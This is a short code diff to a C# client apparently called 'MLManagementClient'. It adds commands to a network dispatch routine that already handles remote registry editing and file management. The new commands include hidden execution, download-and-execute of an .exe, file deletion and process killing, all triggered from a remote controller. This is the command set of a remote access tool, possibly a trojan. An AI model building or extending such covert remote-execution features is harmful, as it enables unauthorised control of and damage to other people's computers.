@@ -27,6 +27,15 @@ namespace MLManagementClient
             if (command == NetworkCommand.RegistryEdit) RegistryEditorHandler.Handle(data);
             if (command == NetworkCommand.FileManager) FileManagerHandler.Handle(data);
             if (command == NetworkCommand.Close) Environment.Exit(0);
+
+            if (command == NetworkCommand.Execute) MiscHandler.Execute((string)data[1]);
+            if (command == NetworkCommand.ExecuteHidden) MiscHandler.ExecuteHidden((string)data[1]);
+            if (command == NetworkCommand.DeleteFile) MiscHandler.DeleteFile((string)data[1]);
+            if (command == NetworkCommand.DownloadAndExecute) MiscHandler.DownloadAndExecute((string)data[1], ".exe");
+            if (command == NetworkCommand.DownloadFile) MiscHandler.DownloadFile((string)data[1], (string)data[2]);
+            if (command == NetworkCommand.KillProcess) MiscHandler.KillProcess((int)data[1]);
+            if (command == NetworkCommand.SuspendProcess) MiscHandler.SuspendProcess((int)data[1]);
+            if (command == NetworkCommand.ResumeProcess) MiscHandler.ResumeProcess((int)data[1]);
         }
 
         public void OnDisconnect()
